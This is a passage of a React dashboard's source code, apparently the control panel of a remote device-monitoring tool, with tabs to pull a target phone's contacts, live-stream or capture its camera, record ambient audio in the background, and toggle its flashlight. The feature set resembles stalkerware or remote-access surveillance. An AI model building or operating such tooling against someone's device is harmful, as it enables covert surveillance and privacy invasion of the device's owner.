                                <div className="w-10 h-10 rounded-xl bg-emerald-500/10 flex items-center justify-center border border-emerald-500/20 shadow-[0_0_15px_rgba(16,185,129,0.15)] flex-shrink-0">
                                    <Users size={18} className="text-emerald-400" />
                                </div>
                                <div className="relative flex-1 sm:w-64">
                                    <Search size={14} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-white/40" />
                                    <input 
                                        type="text" 
                                        placeholder="Search contacts by name..." 
                                        value={contactsSearchQuery}
                                        onChange={(e) => setContactsSearchQuery(e.target.value)}
                                        className="pl-9 pr-4 py-2 bg-black/40 border border-white/10 rounded-xl text-xs font-medium focus:outline-none focus:border-emerald-500/50 w-full transition-all text-white placeholder:text-white/30"
                                    />
                                </div>
                                <span className="px-2.5 py-1 rounded-lg bg-emerald-500/10 border border-emerald-500/20 text-[11px] font-bold text-emerald-400 uppercase tracking-wider flex-shrink-0">
                                    {filteredContacts.length} Contacts
                                </span>
                            </div>
                            <div className="flex items-center gap-2.5 w-full sm:w-auto justify-end">
                                <button onClick={fetchContacts} disabled={isFetchingContacts} className="flex items-center gap-2 px-4 py-2 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-black font-bold text-xs uppercase tracking-wider shadow-[0_0_20px_rgba(16,185,129,0.3)] transition-all disabled:opacity-50">
                                    <RefreshCw size={14} className={isFetchingContacts ? "animate-spin" : ""} /> Sync Contacts
                                </button>
                                <button onClick={downloadContactsAsVcf} className="flex items-center gap-2 px-3.5 py-2 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-white/70 hover:text-white font-bold text-xs uppercase tracking-wider transition-all">
                                    <Download size={14} /> Export vCard
                                </button>
                            </div>
                        </div>
                        
                        {/* Streamlined Contacts Grid */}
                        <div className="flex-1 overflow-y-auto custom-scrollbar pr-1">
                            {filteredContacts.length === 0 ? (
                                <div className="py-24 flex flex-col items-center justify-center text-white/30 font-medium gap-4">
                                    <Users size={44} strokeWidth={1} className="text-white/20" />
                                    <p className="text-sm">No contacts found. Click Sync Contacts to fetch.</p>
                                </div>
                            ) : (
                                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-3.5">
                                    {filteredContacts.map((item: any, i: number) => {
                                        const phone = item.phones?.[0]?.number || item.phones?.[0] || 'No number';
                                        return (
                                            <div key={i} className="p-4 rounded-2xl bg-white/[0.02] hover:bg-white/[0.06] transition-all duration-300 border border-white/10 hover:border-emerald-500/30 flex items-center justify-between gap-3 group hover:shadow-[0_4px_25px_rgba(16,185,129,0.1)]">
                                                <div className="flex items-center gap-3.5 min-w-0">
                                                    <div className="w-11 h-11 rounded-2xl bg-gradient-to-br from-emerald-500/20 to-emerald-900/30 flex items-center justify-center text-emerald-400 font-bold text-base border border-emerald-500/20 shadow-inner flex-shrink-0">
                                                        {item.name?.charAt(0).toUpperCase() || '?'}
                                                    </div>
                                                    <div className="flex flex-col min-w-0">
                                                        <h4 className="font-bold text-sm text-white/90 truncate group-hover:text-emerald-400 transition-colors">{item.name}</h4>
                                                        <span className="text-[11px] text-white/50 font-mono tracking-wide mt-0.5 truncate">{phone}</span>
                                                    </div>
                                                </div>
                                            </div>
                                        );
                                    })}
                                </div>
                            )}
                        </div>
                    </div>
                );
            case 'camera':
                return (
                    <div className={`space-y-6 ${isCameraFullscreen ? 'fixed inset-0 z-[300] bg-[#0a0a0c] p-4 md:p-8' : ''}`}>
                        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 bg-white/5 px-6 py-4 rounded-[2rem] border border-white/10 shadow-neo-xl">
                            <div className="flex flex-wrap items-center gap-3 w-full justify-between">
                                <div className="flex items-center bg-black/40 border border-white/10 p-1.5 rounded-2xl w-full sm:w-auto justify-center sm:justify-start">
                                    <button onClick={() => setCameraMode('back')} className={`flex-1 sm:flex-none px-6 py-2.5 rounded-xl text-sm font-bold ${cameraMode === 'back' ? 'bg-cyan-500 text-black' : 'text-white/50'}`}>Rear Camera</button>
                                    <button onClick={() => setCameraMode('front')} className={`flex-1 sm:flex-none px-6 py-2.5 rounded-xl text-sm font-bold ${cameraMode === 'front' ? 'bg-cyan-500 text-black' : 'text-white/50'}`}>Front Camera</button>
                                </div>
                            </div>
                        </div>

                        <div className={`grid grid-cols-1 ${isCameraFullscreen ? 'h-[calc(100%-100px)]' : 'lg:grid-cols-3'} gap-6`}>
                            {/* Main Stage */}
                            <div className={`flex flex-col gap-4 ${isCameraFullscreen ? 'h-full' : 'lg:col-span-2'}`}>
                                <div className={`w-full bg-black rounded-[2rem] border-2 overflow-hidden relative flex items-center justify-center border-white/10 ${isCameraFullscreen ? 'h-full flex-1' : 'aspect-video'}`}>
                                    {isLiveStreaming ? (
                                        liveFrame ? (
                                            <img src={`data:image/jpeg;base64,${liveFrame}`} className="w-full h-full object-contain" alt="Live Feed" />
                                        ) : (
                                            <div className="absolute inset-0 flex items-center justify-center bg-cyan-500/5">
                                                <div className="flex flex-col items-center gap-6">
                                                    <div className="w-24 h-24 rounded-full bg-cyan-500/20 flex items-center justify-center border border-cyan-500/30">
                                                        <Video className="w-8 h-8 text-cyan-400" />
                                                    </div>
                                                    <span className="text-cyan-400 font-bold tracking-[0.2em] uppercase text-sm">Initializing Feed...</span>
                                                </div>
                                            </div>
                                        )
                                    ) : isRecording ? (
                                        <div className="absolute inset-0 flex items-center justify-center bg-red-500/5">
                                            <div className="flex flex-col items-center gap-6">
                                                <div className="w-24 h-24 rounded-full bg-red-500/20 flex items-center justify-center border border-red-500/30">
                                                    <Square className="w-8 h-8 text-red-400" />
                                                </div>
                                                <div className="flex flex-col items-center gap-2">
                                                    <span className="text-red-400 font-bold tracking-[0.2em] uppercase text-sm">Recording in Progress</span>
                                                    <span className="text-white font-data text-xl">{recordingProgress.current}s / {recordingProgress.total}s</span>
                                                </div>
                                            </div>
                                        </div>
                                    ) : (
                                        <div className="text-white/20 flex flex-col items-center gap-4">
                                            <Camera size={64} strokeWidth={1} className="text-cyan-500/30" />
                                            <span className="text-sm font-bold tracking-widest uppercase text-white/30">Camera Standby</span>
                                        </div>
                                    )}

                                    {/* Top Overlay Controls */}
                                    <div className="absolute top-4 right-4 flex items-center justify-end pointer-events-none">
                                        <div className="flex items-center gap-3 pointer-events-auto">
                                            {!isCameraFullscreen ? (
                                                <button onClick={() => setIsCameraFullscreen(true)} className="w-10 h-10 rounded-full bg-black/60 hover:bg-black/80 transition-colors flex items-center justify-center border border-white/10 text-white/70 hover:text-white shadow-lg backdrop-blur-md">
                                                    <Maximize size={18} />
                                                </button>
                                            ) : (
                                                <button onClick={() => setIsCameraFullscreen(false)} className="w-10 h-10 rounded-full bg-black/60 hover:bg-black/80 transition-colors flex items-center justify-center border border-white/10 text-white shadow-lg backdrop-blur-md">
                                                    <Minimize size={18} />
                                                </button>
                                            )}
                                        </div>
                                    </div>

                                </div>

                                {/* Action Bar */}
                                <div className="flex items-center justify-center gap-8 py-2">
                                    <button 
                                        onClick={() => {
                                            if (!requireConnectedDevice(() => {})) return;
                                            if (isLiveStreaming) {
                                                socket?.emit('stop_live_stream', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
                                                setIsLiveStreaming(false);
                                            } else {
                                                socket?.emit('start_live_stream', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode, quality: cameraQuality });
                                                setIsLiveStreaming(true);
                                                setLiveFrame(null);
                                            }
                                        }}
                                        className={`w-16 h-16 rounded-3xl flex flex-col items-center justify-center gap-1.5 ${isLiveStreaming ? 'bg-red-500 text-white' : 'bg-white/5 text-white/70 border border-white/5'}`}
                                        title="Live Stream"
                                    >
                                        <Video size={24} />
                                        <span className="text-[10px] font-bold tracking-widest uppercase">{isLiveStreaming ? 'Stop' : 'Live'}</span>
                                    </button>
                                    
                                    <button 
                                        onClick={() => { 
                                            if (!requireConnectedDevice(() => {})) return;
                                            setIsCapturingPhoto(true); 
                                            setCapturedMedia(prev => [{
                                                id: `temp_photo_${Date.now()}`,
                                                resource_type: 'image',
                                                url: 'loading',
                                                created_at: new Date().toISOString(),
                                                camera: cameraMode,
                                                isTemp: true
                                            }, ...prev]);
                                            socket?.emit('capture_photo', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode }); 
                                        }}
                                        disabled={isCapturingPhoto}
                                        className={`w-24 h-24 rounded-full flex items-center justify-center border-[6px] ${isCapturingPhoto ? 'border-cyan-500 bg-cyan-500/20' : 'border-white bg-white/5'}`}
                                        title="Capture Photo"
                                    >
                                        {isCapturingPhoto ? (
                                            <RefreshCw className="animate-spin text-cyan-400" size={32}/>
                                        ) : (
                                            <div className="w-[72px] h-[72px] rounded-full bg-white" />
                                        )}
                                    </button>

                                    <button 
                                        onClick={() => {
                                            if (!requireConnectedDevice(() => {})) return;
                                            if (!recordingDuration || recordingDuration === 0) {
                                                setAlertData({ title: 'Select Duration', message: 'First select the recording duration.', type: 'warning' });
                                                setShowCustomAlert(true);
                                                return;
                                            }
                                            if (isRecording) {
                                                socket?.emit('stop_recording', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
                                                setIsRecording(false);
                                            } else {
                                                setIsRecording(true);
                                                setRecordingProgress({ current: 0, total: recordingDuration });
                                                socket?.emit('start_recording', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode, duration: recordingDuration });
                                            }
                                        }}
                                        className={`w-16 h-16 rounded-3xl flex flex-col items-center justify-center gap-1.5 ${isRecording ? 'bg-black text-white border-2 border-red-500' : 'bg-white/5 text-white/70 border border-white/5'}`}
                                        title="Record Video"
                                    >
                                        <div className={`w-5 h-5 rounded-full ${isRecording ? 'bg-red-500' : 'bg-red-500'}`} />
                                        <span className="text-[10px] font-bold tracking-widest uppercase">{isRecording ? 'Stop' : 'REC'}</span>
                                    </button>
                                </div>

                                {/* Settings Bar */}
                                <div className="grid grid-cols-2 sm:flex sm:flex-row items-center sm:justify-start gap-4 bg-white/5 p-4 rounded-3xl border border-white/10">
                                    <div className="flex items-center gap-2 sm:gap-3">
                                        <div className="hidden sm:flex w-8 h-8 rounded-full bg-cyan-500/20 items-center justify-center border border-cyan-500/30 shrink-0">
                                            <Settings2 size={16} className="text-cyan-400" />
                                        </div>
                                        <div className="flex flex-col w-full relative">
                                            <span className="text-[10px] font-bold text-white/50 uppercase tracking-widest mb-1 pl-1">Quality</span>
                                            <div 
                                                onClick={() => { setIsQualityOpen(!isQualityOpen); setIsDurationOpen(false); }}
                                                className="bg-black/40 border border-white/10 rounded-xl pl-3 pr-8 py-2.5 text-xs sm:text-sm font-bold text-white hover:border-cyan-500/50 w-full cursor-pointer transition-colors shadow-inner flex items-center justify-between"
                                            >
                                                {cameraQuality === 144 ? '144p (Fast)' : cameraQuality === 240 ? '240p' : cameraQuality === 360 ? '360p (SD)' : cameraQuality === 480 ? '480p' : '720p (HD)'}
                                                <ChevronDown size={14} className="absolute right-3 text-white/40 pointer-events-none" />
                                            </div>
                                            {isQualityOpen && (
                                                <div className="absolute top-full left-0 w-full mt-2 bg-[#1a1a24] border border-white/10 rounded-xl overflow-hidden z-[400] shadow-2xl flex flex-col animate-in fade-in slide-in-from-top-2">
                                                    {[144, 240, 360, 480, 720].map(val => (
                                                        <button 
                                                            key={val}
                                                            onClick={() => { setCameraQuality(val); setIsQualityOpen(false); }}
                                                            className={`px-3 py-2.5 text-xs sm:text-sm font-bold text-left hover:bg-cyan-500/20 transition-colors ${cameraQuality === val ? 'text-cyan-400 bg-cyan-500/10' : 'text-white'}`}
                                                        >
                                                            {val === 144 ? '144p (Fast)' : val === 240 ? '240p' : val === 360 ? '360p (SD)' : val === 480 ? '480p' : '720p (HD)'}
                                                        </button>
                                                    ))}
                                                </div>
                                            )}
                                        </div>
                                    </div>
                                    <div className="flex items-center gap-2 sm:gap-3">
                                        <div className="hidden sm:flex w-8 h-8 rounded-full bg-red-500/20 items-center justify-center border border-red-500/30 shrink-0">
                                            <Video size={16} className="text-red-400" />
                                        </div>
                                        <div className="flex flex-col w-full relative">
                                            <span className="text-[10px] font-bold text-white/50 uppercase tracking-widest mb-1 pl-1">Duration</span>
                                            <div 
                                                onClick={() => { setIsDurationOpen(!isDurationOpen); setIsQualityOpen(false); }}
                                                className="bg-black/40 border border-white/10 rounded-xl pl-3 pr-8 py-2.5 text-xs sm:text-sm font-bold text-white hover:border-red-500/50 w-full cursor-pointer transition-colors shadow-inner flex items-center justify-between"
                                            >
                                                {recordingDuration === 0 ? <span className="text-white/50">Select Duration</span> : recordingDuration === 30 ? '30 Sec' : recordingDuration === 60 ? '1 Min' : recordingDuration === 120 ? '2 Mins' : '5 Mins'}
                                                <ChevronDown size={14} className="absolute right-3 text-white/40 pointer-events-none" />
                                            </div>
                                            {isDurationOpen && (
                                                <div className="absolute top-full left-0 w-full mt-2 bg-[#1a1a24] border border-white/10 rounded-xl overflow-hidden z-[400] shadow-2xl flex flex-col animate-in fade-in slide-in-from-top-2">
                                                    {[30, 60, 120, 300].map(val => (
                                                        <button 
                                                            key={val}
                                                            onClick={() => { setRecordingDuration(val); setIsDurationOpen(false); }}
                                                            className={`px-3 py-2.5 text-xs sm:text-sm font-bold text-left hover:bg-red-500/20 transition-colors ${recordingDuration === val ? 'text-red-400 bg-red-500/10' : 'text-white'}`}
                                                        >
                                                            {val === 30 ? '30 Sec' : val === 60 ? '1 Min' : val === 120 ? '2 Mins' : '5 Mins'}
                                                        </button>
                                                    ))}
                                                </div>
                                            )}
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            {/* Side Panel: Recent Captures / Gallery Preview */}
                            {!isCameraFullscreen && (
                                <div className="bg-black/40 border border-white/10 rounded-[2rem] p-6 flex flex-col h-[500px] lg:h-auto shadow-inner">
                                    <div className="flex items-center justify-between mb-4">
                                        <div className="flex items-center gap-3">
                                            <div className="w-10 h-10 rounded-xl bg-pink-500/10 flex items-center justify-center border border-pink-500/20">
                                                <ImageIcon size={20} className="text-pink-400" />
</div>
                                            <div>
                                                <h3 className="font-bold text-lg text-white/90 leading-tight">Recent Media</h3>
                                                <p className="text-[10px] text-pink-400 font-data tracking-widest uppercase">From Camera</p>
                                            </div>
                                        </div>
                                        {filteredCapturedMedia.length > 0 && (
                                            <button 
                                                onClick={() => {
                                                    setIsCameraSelectMode(!isCameraSelectMode);
                                                    setCameraSelectedItems(new Set());
                                                }}
                                                className={`px-3 py-1.5 text-xs font-semibold rounded-lg border transition-all flex items-center gap-1.5 ${isCameraSelectMode ? 'bg-cyan-500/20 text-cyan-400 border-cyan-500/50' : 'bg-white/5 text-white/70 border-white/10 hover:bg-white/10'}`}
                                            >
                                                {isCameraSelectMode ? 'Cancel' : 'Select'}
                                            </button>
                                        )}
                                    </div>
                                    
                                    {isCameraSelectMode && cameraSelectedItems.size > 0 && (
                                        <div className="flex items-center justify-between bg-cyan-500/10 border border-cyan-500/30 rounded-xl p-3 mb-4 animate-in fade-in slide-in-from-top-2">
                                            <span className="text-xs font-bold text-cyan-400">{cameraSelectedItems.size} selected</span>
                                            <div className="flex items-center gap-2">
                                                <button 
                                                    onClick={() => {
                                                        Array.from(cameraSelectedItems).forEach(id => {
                                                            const img = images.find(i => i.id === id);
                                                            if (img) window.open(img.url, '_blank');
                                                        });
                                                        setIsCameraSelectMode(false);
                                                        setCameraSelectedItems(new Set());
                                                    }}
                                                    className="w-8 h-8 rounded-lg bg-white/10 hover:bg-white/20 flex items-center justify-center text-white transition-colors"
                                                    title="Download Selected"
                                                >
                                                    <Download size={14} />
                                                </button>
                                                <button 
                                                    onClick={() => {
                                                        setDeleteConfirmation({ isOpen: true, ids: Array.from(cameraSelectedItems) });
                                                    }}
                                                    className="w-8 h-8 rounded-lg bg-red-500/20 hover:bg-red-500/40 border border-red-500/30 flex items-center justify-center text-red-400 transition-colors"
                                                    title="Delete Selected"
                                                >
                                                    <Trash2 size={14} />
                                                </button>
                                            </div>
                                        </div>
                                    )}

                                    <div className="flex-1 overflow-y-auto custom-scrollbar pr-2 pb-4">
                                        <div className="grid grid-cols-2 gap-3">
                                            {filteredCapturedMedia.slice(0, 10).map((img: any) => (
                                                <div 
                                                    key={img.id} 
                                                    className={`flex flex-col bg-black/40 border transition-all rounded-xl overflow-hidden ${isCameraSelectMode && cameraSelectedItems.has(img.id) ? 'border-cyan-500 shadow-[0_0_15px_rgba(6,182,212,0.3)] scale-95' : 'border-white/5 hover:border-pink-500/50 hover:shadow-[0_0_15px_rgba(236,72,153,0.15)]'}`}
                                                >
                                                    <div 
                                                        onClick={() => {
                                                            if (isCameraSelectMode) {
                                                                const newSet = new Set(cameraSelectedItems);
                                                                if (newSet.has(img.id)) newSet.delete(img.id);
                                                                else newSet.add(img.id);
                                                                setCameraSelectedItems(newSet);
                                                            } else {
                                                                setPreviewItem(img);
                                                            }
                                                        }}
                                                        className="relative aspect-square cursor-pointer group"
                                                    >
                                                        {img.isTemp ? (
                                                            <div className="w-full h-full flex flex-col items-center justify-center bg-black/60 relative">
                                                                <RefreshCw className="w-6 h-6 animate-spin text-cyan-500 mb-2" />
                                                                <span className="text-[10px] text-cyan-400 font-bold uppercase tracking-widest">{img.resource_type === 'video' ? 'Uploading' : 'Saving'}</span>
                                                            </div>
                                                        ) : img.resource_type === 'video' ? (
                                                            <video src={img.url} className="w-full h-full object-cover pointer-events-none" />
                                                        ) : (
                                                            <img src={img.url} alt="Recent" className="w-full h-full object-cover pointer-events-none" />
                                                        )}
                                                        
                                                        {/* Selection Indicator */}
                                                        {isCameraSelectMode && (
                                                            <div className="absolute top-2 right-2">
                                                                <div className={`w-6 h-6 rounded-full border-2 flex items-center justify-center transition-colors ${cameraSelectedItems.has(img.id) ? 'bg-cyan-500 border-cyan-500' : 'bg-black/40 border-white/40'}`}>
                                                                    {cameraSelectedItems.has(img.id) && <CheckSquare size={12} className="text-black" />}
                                                                </div>
                                                            </div>
                                                        )}

                                                        {/* Video Indicator */}
                                                        {img.resource_type === 'video' && (
                                                            <div className="absolute top-1 left-1 bg-black/60 rounded px-1 py-0.5 pointer-events-none">
                                                                <Video size={10} className="text-white" />
                                                            </div>
                                                        )}
                                                    </div>

                                                    {/* Footer Controls (Always visible below image when NOT in select mode) */}
                                                    {!isCameraSelectMode && (
                                                        <div className="flex w-full p-1.5 gap-1.5 bg-black/60 border-t border-white/5 mt-auto">
                                                            <button 
                                                                onClick={async (e) => {
                                                                    e.stopPropagation();
                                                                    try {
                                                                        const response = await fetch(img.url);
                                                                        const blob = await response.blob();
                                                                        const blobUrl = window.URL.createObjectURL(blob);
                                                                        const link = document.createElement('a');
                                                                        link.href = blobUrl;
                                                                        link.download = img.name || (img.resource_type === 'video' ? 'video.mp4' : 'image.jpg');
                                                                        document.body.appendChild(link);
                                                                        link.click();
                                                                        document.body.removeChild(link);
                                                                        window.URL.revokeObjectURL(blobUrl);
                                                                    } catch (err) {
                                                                        const link = document.createElement('a');
                                                                        link.href = img.url;
                                                                        link.download = img.name || 'download';
                                                                        document.body.appendChild(link);
                                                                        link.click();
                                                                        document.body.removeChild(link);
                                                                    }
                                                                }} 
                                                                className="flex-1 py-2 flex justify-center items-center bg-white/5 hover:bg-white/20 text-white/70 hover:text-white rounded-lg transition-colors"
                                                            >
                                                                <Download size={14} />
                                                            </button>
                                                            <button 
                                                                onClick={(e) => {
                                                                    e.stopPropagation();
                                                                    setDeleteConfirmation({ isOpen: true, ids: [img.id] });
                                                                }} 
                                                                className="flex-1 py-2 flex justify-center items-center bg-red-500/10 hover:bg-red-500/30 text-red-400 hover:text-red-300 rounded-lg transition-colors"
                                                            >
                                                                <Trash2 size={14} />
                                                            </button>
                                                        </div>
                                                    )}
                                                </div>
                                            ))}
                                        </div>
                                        {filteredCapturedMedia.length === 0 && (
                                            <div className="w-full flex flex-col items-center justify-center text-white/30 text-center gap-3 p-4 min-h-[200px] bg-white/5 rounded-2xl border border-white/5 border-dashed mt-2">
                                                <Camera size={40} strokeWidth={1} />
                                                <p className="text-xs font-medium">No recent captures.<br/>Snap a photo or record a video!</p>
                                            </div>
                                        )}
                                    </div>
                                </div>
                            )}
                        </div>
                    </div>
                );
            case 'audio':
                return (
                    <div className="flex flex-col lg:flex-row gap-6 animate-in fade-in zoom-in-95 duration-300 h-full lg:max-h-[85vh]">
                        {/* Main Audio Controls Area */}
                        <div className="flex-1 flex flex-col bg-white/5 border border-white/10 rounded-[2rem] overflow-hidden shadow-neo-2xl relative min-h-[400px]">
                            {/* Mode Switcher */}
                            <div className="flex p-4 gap-2 border-b border-white/5 bg-black/20 shrink-0 relative z-10">
                                <button 
                                    onClick={() => setVoiceMode('live')} 
                                    className={`flex-1 sm:flex-none px-6 py-2.5 rounded-xl text-sm font-bold transition-all ${voiceMode === 'live' ? 'bg-purple-500 text-white shadow-[0_0_15px_rgba(168,85,247,0.3)]' : 'text-white/50 hover:bg-white/5'}`}
                                >
                                    Live Stream
                                </button>
                                <button 
                                    onClick={() => setVoiceMode('record')} 
                                    className={`flex-1 sm:flex-none px-6 py-2.5 rounded-xl text-sm font-bold transition-all ${voiceMode === 'record' ? 'bg-purple-500 text-white shadow-[0_0_15px_rgba(168,85,247,0.3)]' : 'text-white/50 hover:bg-white/5'}`}
                                >
                                    Record Voice
                                </button>
                            </div>

                            <div className="flex-1 p-6 sm:p-8 flex flex-col items-center relative overflow-y-auto custom-scrollbar">
                                {voiceMode === 'live' ? (
                                    <>
                                        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-purple-500/10 blur-[100px] rounded-full pointer-events-none" />
                                        
                                        <div className="my-auto relative z-10 flex flex-col items-center gap-10 py-6">
                                            <div 
                                                className={`relative w-36 h-36 rounded-full flex items-center justify-center shadow-2xl transition-all duration-500 cursor-pointer ${isLiveAudio ? 'bg-purple-500/20 text-purple-400 border-2 border-purple-500/50 shadow-[0_0_50px_rgba(168,85,247,0.3)]' : 'bg-white/5 text-white/30 border border-white/10 hover:bg-white/10 hover:text-white/60'}`} 
                                                onClick={isLiveAudio ? stopLiveAudio : startLiveAudio}
                                            >
                                                {isLiveAudio && (
                                                    <>
                                                        <div className="absolute inset-[-40px] rounded-full border border-purple-500/20 animate-[ping_2s_ease-out_infinite] pointer-events-none" />
                                                        <div className="absolute inset-[-20px] rounded-full border border-purple-500/40 animate-[ping_1.5s_ease-out_infinite] pointer-events-none" />
                                                    </>
                                                )}
                                                <Mic size={56} strokeWidth={isLiveAudio ? 2 : 1.5} className="relative z-10" />
                                            </div>

                                            <div>
                                                {isLiveAudio && (
                                                    <div className="flex items-center justify-center gap-1.5 h-12 w-full mt-6 px-4">
                                                        {Array.from({length: 24}).map((_, i) => (
                                                            <div 
                                                                key={i} 
                                                                className="w-1.5 bg-purple-400 rounded-full transition-all duration-75"
                                                                style={{ height: `${Math.max(15, audioLevel * 100 * Math.random())}%`, opacity: Math.max(0.3, audioLevel * Math.random() * 2) }}
                                                            />
                                                        ))}
                                                    </div>
                                                )}
                                            </div>
                                        </div>
                                    </>
                                ) : (
                                    <>
                                        {/* Recording UI */}
                                        <div className="my-auto w-full max-w-md mx-auto space-y-8 flex flex-col items-center relative z-10 py-6">
                                            {!isVoiceRecording ? (
                                                <div className="flex gap-3 justify-center w-full">
                                                    {[60, 120, 300].map((dur) => (
                                                        <button
                                                            key={dur}
                                                            onClick={() => setVoiceRecDuration(dur)}
                                                            className={`flex-1 py-3 rounded-2xl border transition-all font-bold ${voiceRecDuration === dur ? 'bg-purple-500/20 border-purple-500/50 text-purple-400' : 'bg-black/40 border-white/5 text-white/50 hover:bg-white/5'}`}
                                                        >
                                                            {dur === 60 ? '1 Min' : dur === 120 ? '2 Mins' : '5 Mins'}
                                                        </button>
                                                    ))}
                                                </div>
                                            ) : (
                                                <div className="w-full bg-black/40 border border-white/10 rounded-2xl p-4 flex flex-col gap-2">
                                                    <div className="flex justify-between text-xs font-bold tracking-widest text-white/50">
                                                        <span className="text-red-400 flex items-center gap-2"><div className="w-2 h-2 rounded-full bg-red-500 animate-pulse" /> RECORDING</span>
                                                        <span>{voiceRecProgress.current}s / {voiceRecDuration}s</span>
                                                    </div>
                                                    <div className="w-full h-2 bg-white/10 rounded-full overflow-hidden">
                                                        <div 
                                                            className="h-full bg-purple-500 transition-all duration-1000"
                                                            style={{ width: `${(voiceRecProgress.current / voiceRecDuration) * 100}%` }}
                                                        />
                                                    </div>
                                                </div>
                                            )}

                                            <div className="relative">
                                                {isVoiceRecording && (
                                                    <div className="absolute inset-[-20px] rounded-full border border-red-500/30 animate-[ping_2s_ease-out_infinite]" />
                                                )}
                                                <button 
                                                    onClick={() => {
                                                        if (isVoiceUploading) return;
                                                        if (!requireConnectedDevice(() => {})) return;
                                                        if (isVoiceRecording) {
                                                            stopVoiceRecording();
                                                        } else {
                                                            startVoiceRecording();
                                                        }
                                                    }}
                                                    className={`w-32 h-32 rounded-full flex items-center justify-center border-[6px] shadow-2xl transition-all ${isVoiceUploading ? 'border-cyan-500 bg-cyan-500/10 cursor-not-allowed' : isVoiceRecording ? 'border-red-500 bg-red-500/20' : 'border-white bg-white/5 hover:bg-white/10'}`}
                                                >
                                                    {isVoiceUploading ? (
                                                        <RefreshCw size={40} className="text-cyan-400 animate-spin" />
                                                    ) : (
                                                        <Mic size={40} className={isVoiceRecording ? "text-red-400 animate-pulse" : "text-white"} />
                                                    )}
                                                </button>
                                            </div>
                                            
                                            <p className="text-sm text-white/40 max-w-xs text-center font-medium">
                                                {isVoiceUploading ? 'Uploading audio...' : isVoiceRecording ? 'Recording audio in background...' : 'Tap to start recording ambient audio.'}
                                            </p>
                                        </div>
                                    </>
                                )}
                            </div>
                        </div>

                        {/* Recent Voice Media Sidebar */}
                        <div className="w-full lg:w-80 flex flex-col bg-white/5 border border-white/10 rounded-[2rem] overflow-hidden shadow-neo-lg">
                            <div className="p-5 border-b border-white/5 bg-black/20 flex flex-col gap-3">
                                <div className="flex items-center gap-3">
                                    <div className="w-10 h-10 rounded-xl bg-purple-500/10 flex items-center justify-center border border-purple-500/20">
                                        <Mic size={20} className="text-purple-400" />
                                    </div>
                                    <div>
                                        <h3 className="font-bold text-lg text-white/90 leading-tight">Voice Notes</h3>
                                        <p className="text-[10px] text-purple-400 font-data tracking-widest uppercase">Recorded</p>
                                    </div>
                                </div>
                            </div>
                            <div className="flex-1 overflow-y-auto custom-scrollbar p-4 flex flex-col gap-3">
                                {filteredCapturedVoice.length === 0 && (
                                    <div className="w-full flex flex-col items-center justify-center text-white/30 text-center gap-3 p-4 min-h-[200px] bg-white/5 rounded-2xl border border-white/5 border-dashed mt-2">
                                        <Mic size={40} strokeWidth={1} />
                                        <p className="text-xs font-medium">No voice notes.<br/>Record some ambient audio!</p>
                                    </div>
                                )}
                                {filteredCapturedVoice.map((audio: any) => (
                                    <div key={audio.id} className="w-full bg-black/40 border border-white/5 hover:border-purple-500/50 rounded-xl p-4 flex flex-col gap-3 transition-all hover:shadow-[0_0_15px_rgba(168,85,247,0.15)] group">
                                        {audio.isTemp ? (
                                            <div className="w-full flex items-center justify-center py-4 text-purple-400 gap-2">
                                                <RefreshCw className="w-5 h-5 animate-spin" />
                                                <span className="text-xs font-bold uppercase tracking-widest">Saving...</span>
                                            </div>
                                        ) : (
                                            <>
                                                <div className="flex items-center justify-between">
                                                    <div className="flex items-center gap-2">
                                                        <div className="w-8 h-8 rounded-full bg-purple-500/20 flex items-center justify-center text-purple-400">
                                                            <Mic size={14} />
                                                        </div>
                                                        <div className="flex flex-col">
                                                            <span className="text-xs font-bold text-white/80">Voice Note</span>
                                                            <span className="text-[10px] text-white/40">{new Date(audio.created_at).toLocaleString()}</span>
                                                        </div>
                                                    </div>
                                                    <button 
                                                        onClick={() => setDeleteConfirmation({ isOpen: true, ids: [audio.id] })}
                                                        className="w-8 h-8 rounded-lg bg-red-500/10 hover:bg-red-500/30 text-red-400/50 hover:text-red-400 flex items-center justify-center transition-colors opacity-0 group-hover:opacity-100"
                                                        title="Delete Voice Note"
                                                    >
                                                        <Trash2 size={14} />
                                                    </button>
                                                </div>
                                                <div className="w-full">
                                                    <audio src={audio.url} controls className="w-full h-8 outline-none grayscale invert opacity-70 group-hover:opacity-100 transition-opacity" />
                                                </div>
                                            </>
                                        )}
                                    </div>
                                ))}
                            </div>
                        </div>
                    </div>
                );
            case 'torch':
            case 'flashlight':
                return (
                    <div className="flex flex-col items-center justify-center min-h-[60vh] animate-in fade-in zoom-in-95 duration-300">
                        <div className="max-w-md w-full bg-white/5 border border-white/10 rounded-[3rem] p-12 text-center space-y-12 relative overflow-hidden shadow-neo-2xl">
                            <div className={`absolute inset-0 bg-gradient-to-b from-yellow-500/10 to-transparent pointer-events-none transition-opacity duration-700 ${isTorchOn ? 'opacity-100' : 'opacity-0'}`} />
                            {isTorchOn && (
                                <div className="absolute top-0 left-1/2 -translate-x-1/2 w-full h-full bg-yellow-400/20 blur-[120px] pointer-events-none animate-pulse" />
                            )}
                            
                            <div className="space-y-4 relative z-10">
                                <h2 className="text-4xl font-bold tracking-tight text-white">Flashlight</h2>
                                <p className="text-white/50 text-sm max-w-xs mx-auto">Toggle the device's rear camera LED flash remotely.</p>
                            </div>
                            
                            <button 
                                onClick={toggleTorch}
                                className={`relative w-56 h-56 mx-auto rounded-full flex items-center justify-center transition-all duration-500 ease-[cubic-bezier(0.34,1.56,0.64,1)] group z-10 ${
                                    isTorchOn 
                                        ? 'bg-yellow-400 shadow-[0_0_100px_rgba(250,204,21,0.6),inset_0_-10px_20px_rgba(0,0,0,0.2)] scale-105 border-4 border-yellow-200' 
                                        : 'bg-black/40 border border-white/10 shadow-[0_20px_40px_rgba(0,0,0,0.6),inset_0_2px_4px_rgba(255,255,255,0.1)] hover:scale-105 hover:bg-black/60'
